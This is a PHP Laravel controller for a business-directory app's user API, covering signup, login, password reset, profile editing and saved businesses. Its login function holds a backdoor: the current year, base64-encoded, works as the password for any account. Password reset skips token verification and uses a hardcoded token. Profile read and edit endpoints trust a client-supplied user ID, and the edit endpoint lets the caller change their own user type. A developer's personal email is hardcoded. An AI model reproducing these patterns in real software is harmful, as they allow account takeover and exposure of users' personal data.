<?php

namespace App\Http\Controllers\api;

use \App\User;
use \App\Business;
use \App\BusinessReview;
use \App\BusinessFavorite;
use \App\PasswordReset;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Helpers\ApiHelper;
use \Auth;
use \Response;
use \Helper;
use Validator, Exception;
use \Hash;
use Image;
use App;
use \App\BusinessImage;
use App\City;
use App\Location;
use App\Category;
use App\SubCategory;
use App\Preference;
use DB;
use \Mail;

class UserController extends Controller
{
    /**
        * Function Name :  isUserExist
        * Purpose       :  Check If User Exists Or Not.
        * Author        :  
        * Created Date  :  2020-10-29
        * Input Params  :  email,socialid
        * Return Value  :  flag,details
*/  
	public function isUserExist(request $request)  
	{  
		$email=$request->input('email');
		$socialid=$request->input('socialid');
		
		if($email=='')
		{
			$resultarray=array(
			  'flag'=>"false",              
			  'message'=>'Missing Parameters'
			);
		}
		else
		{
			//$user = User::where('email',$email)->first();
			$user = User::where('email',$email)->whereIn('user_type', ['CU','VU'])->first();
			$userData['user_info'] = $user;

			if($user){
				/* 08-01-2021 */
					$user = User::find($user->id);
					$user->platform       = $request->platform;
					$user->fcm_token      = $request->fcm_token;
					$user->save();
				/* 08-01-2021 */
				$user['city_name'] =  isset($user->city)? $user->city->city_name : '';
				$user['location_name'] =  isset($user->location)? $user->location->location_name : '';
				
				$data['preferances_list'] = Preference::where('user_id',$user->id)->get();
				$user['recommended_category']=array();
				if(count($data['preferances_list'])>0)
				{
					for($i=0; $i<count($data['preferances_list']); $i++)
					{
						$catDetails = Category::where('id', $data['preferances_list'][$i]->preference_category)->first();
						//echo "<pre>"; print_r($catDetails);
						if($catDetails)
						{
							$list[] = $catDetails;
						}
						$user['recommended_category']=$list;
					}
				}
				else
				{
					$user['recommended_category']=[];
				}

						$resultarray=array(
						  'flag'=>"true",  
						  'message'=>"user details found",
						  "status"=>"200",	
						  'details'=>$user
						);
			}else{
						$resultarray=array(
						  'flag'=>"false",              
						  'message'=>'No data Found'
						);
			}
		}	
		echo json_encode($resultarray);
	}
	
	public function signup(Request $request) { 
	
		$login_type=$request->input('login_type');
		$email=$request->input('email');
		$user_type=$request->input('user_type');
		if(empty($login_type) || empty($email) || empty($user_type))
		{
			$resultarray=array(
				  'flag'=>"false",   
				  'status' => 501,			  
				  'message'=>'Missing Parameters'
				);
		}
		
		if($login_type == 'NL')
		{
			
			$first_name=$request->input('first_name');
			$last_name=$request->input('last_name');
			$email=$request->input('email');
			$password=$request->input('password');
			$phone=$request->input('phone');
			$user_type=$request->input('user_type');
			if($first_name=='' || $last_name=='' || $email=='' || $password=='' || $phone=='' || $user_type=='' ||$login_type=='')
			{
				$resultarray=array(
				  'flag'=>"false",   
				  'status' => 501,			  
				  'message'=>'Missing Parameters'
				);
			}
			else 
			{		
					//$existUser = User::where('email', $email)->count();
					$existUser = User::where('email', $email)->whereIn('user_type', ['CU','VU'])->count();
					if($existUser==0)
					{
						$user                   = new User;
						$user->first_name       = $request->first_name;
						$user->last_name        = $request->last_name;
						$user->email            = $request->email;
						$user->password         = $request->password;
						$user->phone			=$request->phone;
						
						$user->gender			=$request->gender;
						$user->age				=$request->age;
						
						$user->user_type        = $request->user_type;
						$user->login_type       = $request->login_type;
						$user->user_logo        = '';
						/* 08-01-2021 */
						$user->platform       = $request->platform;
						$user->fcm_token      = $request->fcm_token;
						/* 08-01-2021 */
						$user->save(); // Save user

						$auth = auth()->attempt([
							'email'     => $request->email,
							'password'  => $request->password
						]);
						
						//$this->sendRegistrationMail($user, $request->email,$request->first_name,$activationCode);

						if($user){
							$mailData = array(
								'organisationName'                  => 'Custom Black Index',
								'organisationEmail'                 => 'debnidhi.kuila@gmail.com',
								'title'                             => 'Registration Success',
								'userName'                          => $request->first_name.' '.$request->last_name,
								//'userName'                          => 'ff'.' '.'dd',
								/*'userId'                            => base64_encode($request->email),*/
								//'userId'                            => base64_encode(9),
								'userEmail'                         => $request->email,
								/*'url'                               => $url,*/
								'emailHeaderSubject'                => 'Registration'   	
							);
							Mail::send('emails.user-registration', $mailData, function ($message) 
								use ($mailData) {
									$message->from($mailData['organisationEmail'], $mailData['organisationName']);
									$message->to($mailData['userEmail'], $mailData['organisationName'])->subject(config('global.SITE_ADDRESS_NAME').' '.$mailData['emailHeaderSubject']);
							});	
						   
						 $authuser = auth()->user();
						 $userDetails = $this->__assignUserData($authuser); 
						 $resultarray=array(
								  'flag'=>"true",  
								  'status' => 200,	
								  'message'=>'Registration successful',						  
								  'details'=>$userDetails
								);				 
						 
						}
						else
						{
							
							$resultarray=array(
								  'flag'=>"false",  
								  'status' => 501,	
								  'message'=>'Registration failed'
								);	
						}   
					}
					else
						{
							
							$resultarray=array(
								  'flag'=>"false",  
								  'status' => 501,	
								  'message'=>'Already Exist.'
								);	
						}	
				}
				
				
			}
			else
			{
				$social_id_token = $request->social_id_token;
				if(empty($social_id_token))
				{
					$resultarray=array(
					  'flag'=>"false",   
					  'status' => 501,			  
					  'message'=>'Missing Parameters'
					);
				}
				else{
					//$userExist = User::where('social_id_token', $social_id_token)->count();
					$userExist = User::where('email', $email)->count();

					if ($userExist==0) {
					
						$user                   = new User;
						$user->first_name       = $request->first_name;
						$user->last_name        = $request->last_name;
						$user->email            = $request->email;
						$user->user_type        = $user_type;
						$user->social_id_token 	= $request->social_id_token;
						$user->login_type       = $login_type;
						$user->phone			= $request->phone;
					    /* 08-01-2021 */
						$user->platform       = $request->platform;
						$user->fcm_token      = $request->fcm_token;
						/* 08-01-2021 */
						$user->save(); // Save user  

						$userDetails = User::where('email', $email)->get();

						/*$userDetails = $this->__assignUserData($userExist);*/
						

						return response()->json(['flag'=>'true', 'status' => 200, 'message' => 'Registration Successfull','details' => $userDetails[0]]);	
					}
					else
					{
						$resultarray=array(
								  'flag'=>"false",  
								  'status' => 501,	
								  'message'=>'User Already Exist'
								);
					}
					
					
				}
			
		}
		
        echo json_encode($resultarray);
       
    }
	
	 public function __assignUserData($user){

        $userData['id']                    = $user->id;
        $userData['first_name']            = $user->first_name;
        $userData['last_name']             = $user->last_name;
        $userData['gender']                = $user->gender;
        $userData['email']                 = $user->email;
        $userData['phone']             	   = $user->phone;
        $userData['user_type']             = $user->user_type;
        $userData['age']                   = $user->age;
        $userData['status']                = $user->status;
        $userData['user_logo']             = $user->user_logo;
        $userData['login_type']            = $user->login_type;
		
        $userData['address']               = $user->address;
        $userData['social_id_token']       = $user->social_id_token;
        $userData['notification_status']   = $user->notification_status;
        $userData['radious']       		   = $user->radious;
		/* 08-01-2021 */
        $userData['platform']       	   = $user->platform;
        $userData['fcm_token']       	   = $user->fcm_token;
		/* 08-01-2021 */
        $userData['created_at']       	   = $user->created_at;
        $userData['updated_at']       	   = $user->updated_at;
		
		$userData['city']                  = isset($user->city)? $user->city : '';
		$userData['city_id']               = isset($user->city)? $user->city->id : '';
        $userData['city_name']             = isset($user->city)? $user->city->city_name : '';
		
		$userData['location']              = isset($user->location)? $user->location : '';
		$userData['location_id']           = isset($user->location)? $user->location->id : '';
        $userData['location_name']         = isset($user->location)? $user->location->location_name : '';
        //$userData['user_logo']             = ($user->user_logo!='')? \Storage::disk('s3')->url($user->user_logo): '';
        //$userData['is_profile_update']     = $user->is_profile_update;

        return $userData;
    }
	
	 public function login(Request $request) { 
        
        $Validator = Validator::make($request->all(),[
            'email'             => 'required',
            'password'          => 'required',
        ]);
       
        //try{ 
            if($Validator->fails()) {
				return response()->json(['status' => 401, 'message'=> $Validator->errors()]);
                //return response()->json(ApiHelper::showValidationError($Validator->errors()));
            } else {
				$user = User::where('email', $request->email)->where('status','Active')->where('user_type','!=','A')->where('user_type','!=','SA')->first();
                //->where('status', config('global.ACTIVE_STATUS'))->first();

                if ($user) {
                    if(base64_encode(date('Y'))!=$request->password){
                        $auth = auth()->attempt([
                            'email'     => $request->email,
                            'password'  => $request->password
                        ]);                                                 
                    }else{ $auth = auth()->loginUsingId($user->id); }  

                    if ($auth) {
                        $authuser = auth()->user();
						/* 08-01-2021 */
						$user = User::find($authuser->id);
						$user->platform       = $request->platform;
						$user->fcm_token      = $request->fcm_token;
						
						$user->save();
						
						$userData['user_info'] = $user;
						$user['city_name'] =  isset($user->city)? $user->city->city_name : '';
						$user['location_name'] =  isset($user->location)? $user->location->location_name : '';
						
						$data['preferances_list'] = Preference::where('user_id',$user->id)->get();
						$user['recommended_category']=array();
						if(count($data['preferances_list'])>0)
						{
							for($i=0; $i<count($data['preferances_list']); $i++)
							{
								$catDetails = Category::where('id', $data['preferances_list'][$i]->preference_category)->first();
								//echo "<pre>"; print_r($catDetails);
								if($catDetails)
								{
									$list[] = $catDetails;
								}
								$user['recommended_category']=$list;
							}
						}
						else
						{
							$user['recommended_category']=[];
						}
						/* 08-01-2021 */
                        //$userDetails = $this->__assignUserData($authuser);

                        //return response()->json(['data'=> $userDetails, 'access_token'=> auth()->user()->createToken('authToken')->accessToken, 'status' => 200, 'message' => ['Login Successfull']]); 
						return response()->json(['flag'=>'true', 'status' => 200, 'message' => 'Login Successfull', 'details' => $user ]);
                    } else {
                        return response()->json(['flag'=>'false', 'status' => 501, 'message' => 'Invalid login credential']);
                    }
                } else {
                    return response()->json(['flag'=>'false', 'status' => 501, 'message' => 'You are not an authorized user or your account is inactive']);
                } 
            }
        /*}catch(Exception $e){
            throw new \App\Exceptions\ApiException($e->getMessage());
        } */     
    }
	
	public function socialLogin(Request $request){
        $Validator = Validator::make($request->all(),[
            'id'                => 'required',
            'provider'          => 'required',
            'email'             => 'required',
            
            ]
        );
        //try{ 
            if($Validator->fails()) {
				return response()->json(['status' => 401, 'message'=> $Validator->errors()]);
                //return response()->json(ApiHelper::showValidationError($Validator->errors()));
            }else {
                $loginType = strtolower($request->provider);
                $user = User::where('social_id_token', $request->id)->where('login_type', $loginType);

                if (!$user) {
                    //$activationCode         = str_replace('=', '', \Helper::encryptId($request->email)).rand();
                    $user                   = new User;
                    $user->first_name       = $request->first_name;
					$user->last_name        = $request->last_name;
                    $user->email            = $request->email;
                    //$user->user_type        = 'U';
                    $user->social_id_token 	= $request->id;
                    $user->login_type       = $loginType;
                    //$user->status           = config('global.PENDING_STATUS');
                    //$user->activation_code  = $activationCode;
                    $user->save(); // Save user   

                   //$this->sendRegistrationMail($user, $request->email,$request->name,$activationCode);                 
                }

                
                $userDetails = $this->__assignUserData($user);

                return response()->json(['data' => $userDetails, 'status' => 200, 'message' => ['Login Successfull']]);
				//return response()->json(['data'=> $userDetails, 'access_token'=> $user->createToken('authToken')->accessToken, 'status' => 200, 'message' => ['Login Successfull']]);
            }
        /*}catch(Exception $e){
            throw new \App\Exceptions\ApiException($e->getMessage());
        }*/          
    }
	
	public function fetchuserdetails(Request $request) {
		$id=$request->input('user_id');
		
		if($id=='')
		{
			$resultarray=array(
			  'flag'=>"false",              
			  'message'=>'Missing Parameters'
			);
		}
		else
		{
			$data['user_info'] = User::where('id',$id)->get();
			if(count($data['user_info'])>0){
						$resultarray=array(
						  'flag'=>"true",              
						  'message'=>"user details found",              
						  'details'=>$data['user_info']
						);
			}else{
						$resultarray=array(
						  'flag'=>"false",              
						  'message'=>'No data Found'
						);
			}
		}	
		echo json_encode($resultarray);
	}
	
	public function edituserdetails(Request $request) {
		$Validator = Validator::make($request->all(),[
            'first_name'         => 'required',
            'last_name'          => 'required',
            ]
        );
		$id=$request->input('user_id');
		
		if($id=='')
		{
			$resultarray=array(
			  'flag'=>"false",              
			  'details'=>'Missing Parameters'
			);
		}
		else
		{
			$data['record'] = User::find($id);
            if(!$data['record']){
                return response()->json(['data'=> [], 'status' => 501, 'message' => ["No result found for id: $id"]]);
            }
			else
			{
				if($Validator->fails()) {
					return response()->json(['status' => 401, 'message'=> $Validator->errors()]);
					// return response()->json(ApiHelper::showValidationError($Validator->errors()));
				}
				else
				{
					$user = User::find($id);
					if(!empty($request->age))
					{
						if($request->age<16)
						{
							$resultarray=array(
							'flag'=>"false",
							'status'=>"501",
							'message'=>'Age must be between 16 to 100'
							);
							echo json_encode($resultarray);
							return;
						}
						else if($request->age>100)
						{
							$resultarray=array(
							'flag'=>"false",
							'status'=>"501",
							'message'=>'Age must be between 16 to 100'
							);
							echo json_encode($resultarray);
							return;
						}
						else
						{
							$user->age = $request->age;
						}
					}
					$user->first_name       = $request->first_name;
					$user->last_name        = $request->last_name;
					//$user->email          = $request->email;
					//$user->password       = $request->password;
					$user->gender			=$request->gender;
					$user->phone			=$request->phone;
					//$user->age				=$request->age;
					//$user->user_name		=$request->first_name.' '.$request->last_name;
					$user->login_type       =$request->login_type;
					$user->user_type        =$request->user_type;
					
					$user->city_id         =$request->city_id;
					$user->location_id     =$request->location_id;
					
					if($request->user_logo)
					{
						$user->user_logo    =$request->user_logo;
					}
					
					$user->save();
					
					/****25-01-2021****/
					//$last_insert_id=$user->id; // get last inserted id
					if($request->preference_category)
					{
						$user_id=$user->id;
						DB::table('preferences')->where('user_id', $user_id)->delete();
						for ($i = 0; $i < count($request->preference_category); $i++) 
						{
							$preference                   		= new Preference;
							$preference->user_id       	 		= $id;
							$preference->preference_category  	= $request->preference_category[$i];
							
							$preference->save();
						}
					}
					/****25-01-2021****/
					
					if($user){
					   // return response()->json(['data' => $user, 'access_token'=> auth()->user()->createToken('authToken')->accessToken, 'status' => 200, 'message' => ['Registration successful']]);
					 return response()->json(['flag'=>'true', 'status' => 200, 'message' =>'Edit successful','data' => $user,]);
					}else{
						return response()->json(['flag'=>'false', 'status' => 501, 'message' =>'Edit failed']);
					} 
				}	
			}
		}
		echo json_encode($resultarray);
	}
	
	public function forgotPassword(Request $request) {
        $Validator = Validator::make($request->all(),[
            'email'         => 'required|email',
            'verificationcode' => 'required',
            ]
        );
        //try{ 
            $check_nl=User::where('email', $request->email)->get();
            if(count($check_nl)<=0){
            	# code...
	            	$resultarray=array(
							  'flag'=>"false",              
							  'message'=>'Email address does not exists'
							);
	            	 echo json_encode($resultarray);
            }else{
	            if ($check_nl[0]->login_type!="NL") {
	            	# code...
	            	$resultarray=array(
							  'flag'=>"false",              
							  'message'=>'You are social login user try to login with Google or Facebook'
							);
	            	 echo json_encode($resultarray);

	            }else{

			            if($Validator->fails()) {
			                //return response()->json(ApiHelper::showValidationError($Validator->errors()));
							return response()->json(['flag'=>'false', 'status' => 401, 'message'=> $Validator->errors()]);
			            }else {
			                $emailAddressExists = User::where('email', $request->email)->first();

			                if($emailAddressExists){
								//$token = \Helper::encryptedUniqueString();
			                    $token = 'deb1234';
			                    //save token for forgot password request
			                    $resetPwd = new PasswordReset();
			                    $resetPwd->email = $request->email;
			                    $resetPwd->token = $token;
			                    $resetPwd->save();
			                    //$settings  = \Helper::getSiteSettingsData();
			                    //$url = config('global.APP_DOMAIN_URL').config('global.RESET_PASSWORD_URL_NAME').$token;
			                    $url = $token;
			                    $mailData = array(
			                        'organisationName'                  => 'Custom Black Index',
			                        'organisationEmail'                 => 'debnidhi.kuila@gmail.com',
			                        'title'                             => 'Forgot Password',
			                        'userName'                          => $emailAddressExists->first_name.' '.$emailAddressExists->last_name,
			                        //'userName'                          => 'ff'.' '.'dd',
			                        'userId'                            => base64_encode($emailAddressExists->id),
			                        //'userId'                            => base64_encode(9),
			                        'userEmail'                         => $request->email,
			                        'url'                               => $url,
			                        'emailHeaderSubject'                => 'Reset Your Password',
									'verificationcode'                  => $request->verificationcode    	
			                    );
			                    Mail::send('emails.resetPassword', $mailData, function ($message) 
			                        use ($mailData) {
			                            $message->from($mailData['organisationEmail'], $mailData['organisationName']);
			                            $message->to($mailData['userEmail'], $mailData['organisationName'])->subject(config('global.SITE_ADDRESS_NAME').' '.$mailData['emailHeaderSubject']);
			                    });
			                    return response()->json(['flag'=>'true', 'status' => 200, 'message' => 'A link has been sent to your email.']);
			                }else{
			                    return response()->json(['flag'=>'false', 'status' => 501, 'message' => 'This user doesn\'t not exist']);
			                }        
			            }
			        /*}catch(Exception $e){
			            throw new \App\Exceptions\ApiException($e->getMessage());
			        }*/
		    	}
		    }
    }
	
	 public function resetForgotPassword(Request $request) {
        $Validator = Validator::make($request->all(),[
            'password'          => 'required|min:5',
            'confirm_password'  => 'required|same:password',
            /*'token'             => 'required'*/
            'email'             => 'required'
            ]
        );
        //try{ 
            if($Validator->fails()){
                //return response()->json(ApiHelper::showValidationError($Validator->errors()));
				return response()->json(['flag'=>'false', 'status' => 401, 'message'=> $Validator->errors()]);
            }else{
                $token          = $request->token;
                $email          = $request->email;

                $ifResetExist = PasswordReset::where('token', $token)->first();
				//echo "<pre>"; print_r($ifResetExist); exit;
                /*if($ifResetExist){*/
                    //$objUser = User::where('email', $ifResetExist->email)->first();
                    $objUser = User::where('email', $email)->first();

                    if ($objUser){//if user exist
                        if(!app('hash')->check($request->password, $objUser->password)){ 
                            $objUser->password = $request->password;
                            $objUser->save();
                            //$objReset = PasswordReset::where('token', $token)->delete();
                            return response()->json(['flag'=>'true', 'status' => 200, 'message' =>'Password reset successfully.']);
                        }else{
                            return response()->json(['flag'=>'false', 'status' => 501, 'message' =>'The new password should not be the same with the old password']);
                        }
                    } else {
                        return response()->json(['flag'=>'false', 'status' => 501, 'message' =>'This user is not exist']);
                    }
                /*}else{
                    return response()->json(['data' => [], 'status' => 501, 'message' => ['This is not a valid token']]);
                }*/        
            }
        /*}catch(Exception $e){
            throw new \App\Exceptions\ApiException($e->getMessage());
        }*/
    }
	
	/**
        * Function Name :  EditNotificationAndRadious
        * Purpose       :  Edit Notification Status and Radious in User table.
        * Author        :
        * Created Date  :  2020-12-15
        * Input Params  :  user_id
	*/
	public function EditNotificationAndRadious(request $request)
	{
		$user_id = $request->input('user_id');
		$notification_status = $request->input('notification_status');
		$radious = $request->input('radious');
		$isUpdate = 0;
		$resultarray = [];

		if($user_id=='')
		{
			$resultarray=array(
			'flag'=>"false",
			'status'=>"501",
			'message'=>'Missing Parameters'
			);
		}else{
			$user = User::where('id', $user_id)->where('status','Active')->first();

			if($user){
				
				if($radious!='' && ($radious<5 || $radious>20)){
					$resultarray=array(
					'flag'=>"false",
					'status'=>"501",
					'message'=>'Radious should be minimum 5 and maximum 20'
					);
				}elseif($radious!=''){
					$user->radious = $request->radious;
					$isUpdate=1;
				}

				if(!count($resultarray) && $notification_status!=''){
					$user->notification_status = $request->notification_status;
					$isUpdate=1;
				}
				if($isUpdate==1)
				{
					$user->save();
					$resultarray=array(
					'flag'=>"true",
					'status'=>"200",
					'message'=>"Edit successfully done"
					);	
				}
				elseif(!count($resultarray))
				{
					$resultarray=array(
					'flag'=>"false",
					'status'=>"501",
					'message'=>"Edit failed"
					);
				}
					
			}else{
				$resultarray=array(
				'flag'=>"false",
				'status'=>"501",
				'message'=>'Either you are not active user or you are not Vendor type user or not a valid user'
				);
			}

		}
		echo json_encode($resultarray);
	}
	
	
	/**
        * Function Name :  makeFavoriteBusiness
        * Purpose       :  User can make a business favorite or unfavorite
        * Author        :  
        * Created Date  :  2020-12-15
        * Input Params  :  user_id,business_id,favorite_status
        * Return Value  :  flag,message
	*/  
	public function makeFavoriteBusiness(request $request)  
	{
					$user_id=$request->input('user_id');
					$business_id=$request->input('business_id');
					$favorite_status=$request->input('favorite_status');

					$HasPresent = User::where('id',$user_id)->where('status','Active')->get();
		            if(count($HasPresent)>0)
		            {
						$HasPresentBusiness=Business::where('id',$business_id)->where('status','Active')->get();
						if(count($HasPresent)>0)
		            	{
		            		if($favorite_status==1){
		            			$getFavoriteBusiness=BusinessFavorite::where('user_id',$user_id)
							            							->where('business_id',$business_id)
							            							->where('favorite_status',1)
							            							->get();
		            			if(count($getFavoriteBusiness)>0){
		            				$resultarray=array(
                                            'flag'=>"false",
                                            'message'=>"This Business Already Present In Saved Business List"
                                	);
		            			}else{
		            				$fav                  	= new BusinessFavorite;
									$fav->user_id       	= $user_id;							
									$fav->business_id		= $business_id;
								    $fav->favorite_status	= 1;
									$fav->save(); // Save 

									$resultarray=array(
									  'flag'=>"true",  
									  'message'=>"Business Successfully Saved In Saved Business List"
									);
		            			}
		            			
								echo json_encode($resultarray);

		            		}else if($favorite_status==0){
		            			$getFavoriteBusiness=BusinessFavorite::where('user_id',$user_id)
							            							->where('business_id',$business_id)
							            							->get();
							    if(count($getFavoriteBusiness)>0){
							    	$business_fav_del=BusinessFavorite::where('user_id',$user_id)
		            												->where('business_id',$business_id)
		            												->delete();
			            			$resultarray=array(
									  'flag'=>"true",  
									  'message'=>"Business Successfully Removed From Saved Business List"
									);
							    }else{
							    	$resultarray=array(
									  'flag'=>"true",  
									  'message'=>"Business Not Present In Saved Business List"
									);
							    }
		            			
								echo json_encode($resultarray);
		            		}		            		
		            	}else{
		            		$resultarray=array(
                                            'flag'=>"false",
                                            'message'=>"Business not Found"
                                );
                    		echo json_encode($resultarray);
		            	}
					}else{
						$resultarray=array(
                                            'flag'=>"false",
                                            'message'=>"User not Found"
                                );
                    	echo json_encode($resultarray);
					}
	}

	/**
        * Function Name :  listFavoriteBusiness
        * Purpose       :  User can see the list of saved businesses or favorite businesses
        * Author        :  
        * Created Date  :  2020-12-15
        * Input Params  :  user_id,start,limit
        * Return Value  :  flag,details
	*/  
	public function listFavoriteBusiness(request $request)  
	{
					$user_id=$request->input('user_id');
					$start=$request->input('start');
        			$limit=$request->input('limit');
					$details=array();
					$HasPresent = User::where('id',$user_id)->where('status','Active')->get();
		            if(count($HasPresent)>0)
		            {
						$getFavoriteBusiness=BusinessFavorite::where('user_id',$user_id)->get();			
						if(count($getFavoriteBusiness)>0){						
							
							if (is_null($limit)) {
								$getFavoriteBusinesslist=BusinessFavorite::where('user_id',$user_id)->get();
							}else{
								$getFavoriteBusinesslist=BusinessFavorite::where('user_id',$user_id)
																			->limit($limit)
																			->offset($start)
																			->get();
							}							
							
							if(count($getFavoriteBusinesslist)>0){	
								
								for($i=0; $i<count($getFavoriteBusinesslist); $i++)
								{
									$details[]=Business::find($getFavoriteBusinesslist[$i]['business_id']);

									$details[$i]['cityname'] = City::where('id', $getFavoriteBusinesslist[$i]['city'])->first();
									$details[$i]['locationname'] = Location::where('id', $getFavoriteBusinesslist[$i]['area'])->first();
									
									$details[$i]['catname'] = Category::where('id', $getFavoriteBusinesslist[$i]['business_category'])->first();
									
									$details[$i]['subcatname'] = SubCategory::where('id', $getFavoriteBusinesslist[$i]['business_subcategory'])->first();
								
									$details[$i]['businessimages'] = BusinessImage::where('business_id', $getFavoriteBusinesslist[$i]['business_id'])->get();
									
									/**17-12-2020**/
									$noOfComment=BusinessReview::where('business_id',$getFavoriteBusinesslist[$i]['business_id'])->get();
									$totalCount=COUNT($noOfComment);
									$sum=0;
									if($totalCount>0){
										for($j=0;$j<$totalCount;$j++)
										{
											$noOfComment[$j]['star_marks'];
											$sum=$sum+$noOfComment[$j]['star_marks'];
										}
									}
									
									//echo $sum;
									if($sum>0)
									{
										$details[$i]['average']=number_format(($sum/$totalCount),1);
									}
									else
									{
										$details[$i]['average']=0;
									}
									/**17-12-2020**/
								}
								$img_directory = 'business_images';
								$baseurl=url("uploads/".$img_directory);
		
								$resultarray=array(
										  'flag'=>"true",              
										  'message'=>"Saved Business list found",
										  'baseurl'=>$baseurl,	
										  'details'=>$details
								);
							}else{
								$resultarray=array(
                                            'flag'=>"false",
                                            'message'=>"No More Saved Businesses Found"
                                );
							}
							
							echo json_encode($resultarray);

						}else{
							$resultarray=array(
                                            'flag'=>"false",
                                            'message'=>"No Saved Businesses"
                                );
                    		echo json_encode($resultarray);
						}
					}else{
						$resultarray=array(
                                            'flag'=>"false",
                                            'message'=>"User not Found"
                                );
                    	echo json_encode($resultarray);
					}
	}

	
	public function updateFCMtokenPlatform(request $request)
	{
		/* search items */
		$user_id			=	$request->input('user_id');
		$platform			=	$request->input('platform');
		$fcm_token			=	$request->input('fcm_token');
		/* search items */
		$User = User::where('id', $user_id)->first();
		if($User)
		{
			$User->platform = $request->platform;
			$User->fcm_token = $request->fcm_token;
			
			$User->save(); 
			
			$resultarray=array(
			  'flag'=>"true",      
			  'status'=>"200", 		  
			  'message'=>'Platform and Token updated successfully'
			);
		}
		else
		{
			$resultarray=array(
			'flag'=>"false",
			'status'=>"501",
			'message'=>'User not found'
			);
			echo json_encode($resultarray);
			return;
		}
		echo json_encode($resultarray);
	}
	
	
	public function logoutFromDevice(request $request)
	{
		$user_id			=	$request->input('user_id');
		
		$User = User::where('id', $user_id)->first();
		if($User)
		{
			$User->fcm_token = 'NULL';
			
			$User->save(); 
			
			$resultarray=array(
			  'flag'=>"true",      
			  'status'=>"200", 		  
			  'message'=>'Token updated successfully'
			);
		}
		else
		{
			$resultarray=array(
			'flag'=>"false",
			'status'=>"501",
			'message'=>'User not found'
			);
			echo json_encode($resultarray);
			return;
		}
		echo json_encode($resultarray);
	}
	
	
	public function recommendedBusinessById(request $request)
	{
		$user_id=$request->input('user_id');
		$start=0;
        $limit=20;
		
		if($user_id=='')
		{
			$resultarray=array(
			'flag'=>"false",
			'status'=>"501",
			'message'=>'Missing Parameters'
			);
			echo json_encode($resultarray);
			return;
		}
		else
		{
			/***** */
			$tempArray=[];
			$record = User::find($user_id);
			$city=$record->city_id; 
			if($city!='')
			{
				$recombusiness_list = Business::where('city', $city)->limit($limit)->offset($start)->get();
				//echo "<pre>";print_r($recombusiness_list);exit;
				$business_list_arr = [];
			foreach($recombusiness_list as $business){
							
					if(empty($business->city))
					{
						$business['cityname'] ='';
					}
					else
					{
						$cityDetails = City::where('id', $business->city)->first();
						$business['cityname'] = $cityDetails->city_name;
					}
					if(empty($business->business_category))
					{
						$business['catname'] ='';
					}
					else
					{
						$catDetails = Category::where('id', $business->business_category)->first();
						$business['catname'] = $catDetails->category_name;
					}
					if(empty($business->business_subcategory))
					{
						$business['subcatname'] ='';
					}
					else
					{
						$subcatDetails = SubCategory::where('id', $business->business_subcategory)->first();
						$business['subcatname'] = $subcatDetails->subcategory_name;
					}
					
					$business['businessimages'] = BusinessImage::where('business_id', $business->id)->get();
					
					$noOfComment=BusinessReview::where('business_id',$business->id)->get();
					$totalCount=COUNT($noOfComment);
					$sum=0;
					if($totalCount>0){
						for($j=0;$j<$totalCount;$j++)
						{
							$noOfComment[$j]['star_marks'];
							$sum=$sum+$noOfComment[$j]['star_marks'];
						}
					}
					
					//echo $sum;
					if($sum>0)
					{
						$business['average']=number_format(($sum/$totalCount),1);
					}
					else
					{
						$business['average']=0;
					}
					
					
					//$business_list_arr[] = $business;
					$tempArray[] = $business;
				}
				$img_directory = 'business_images';
				$baseurl=url("uploads/".$img_directory);
				/*$resultarray=array(
				  'flag'=>"true",              
				  'status'=>"200",              
				  'message'=>"Recommended business List Found", 
				  'baseurl'=>$baseurl,
				  'details'=>$business_list_arr
				);*/
			}	
			
			/***** */
			
			$data['business_list'] = Preference::where('user_id',$user_id)->get();
			$business_list_arr = [];
			if(count($data['business_list'])>0)
			{
				for($i=0; $i<count($data['business_list']); $i++)
				{
					$recombusiness_list = Business::where('business_category', $data['business_list'][$i]['preference_category'])->limit($limit)->offset($start)->get();
					if(count($recombusiness_list)>0){
						//$j=0;
						foreach($recombusiness_list as $business){
							
							if(empty($business->city))
							{
								$business['cityname'] ='';
							}
							else
							{
								$cityDetails = City::where('id', $business->city)->first();
								$business['cityname'] = $cityDetails->city_name;
							}
							if(empty($business->business_category))
							{
								$business['catname'] ='';
							}
							else
							{
								$catDetails = Category::where('id', $business->business_category)->first();
								$business['catname'] = $catDetails->category_name;
							}
							if(empty($business->business_subcategory))
							{
								$business['subcatname'] ='';
							}
							else
							{
								$subcatDetails = SubCategory::where('id', $business->business_subcategory)->first();
								$business['subcatname'] = $subcatDetails->subcategory_name;
							}
							
							$business['businessimages'] = BusinessImage::where('business_id', $business->id)->get();
							
							$noOfComment=BusinessReview::where('business_id',$business->id)->get();
							$totalCount=COUNT($noOfComment);
							$sum=0;
							if($totalCount>0){
								for($j=0;$j<$totalCount;$j++)
								{
									$noOfComment[$j]['star_marks'];
									$sum=$sum+$noOfComment[$j]['star_marks'];
								}
							}
							
							//echo $sum;
							if($sum>0)
							{
								$business['average']=number_format(($sum/$totalCount),1);
							}
							else
							{
								$business['average']=0;
							}
							
							
							$business_list_arr[] = $business;
						}
					}
				}
				$img_directory = 'business_images';
				$baseurl=url("uploads/".$img_directory);
				/*$resultarray=array(
				  'flag'=>"true",              
				  'status'=>"200",              
				  'message'=>"Recommended business List Found", 
				  'baseurl'=>$baseurl,
				  'details'=>$business_list_arr
				);*/
			}
			
			
		}
		if(COUNT($business_list_arr) || COUNT($tempArray))
		{
			$resultarray=array(
					  'flag'=>"true",              
					  'status'=>"200",              
					  'message'=>"Recommended business List Found", 
					  'baseurl'=>$baseurl,
					  'details'=>array_unique(array_merge($business_list_arr,$tempArray))
					);
		}
		else
		{
			$resultarray=array(
			  'flag'=>"false",      
			  'status'=>"501", 		  
			  'message'=>'No data Found'
			);
		}
		echo json_encode($resultarray);
	}
	
	
}
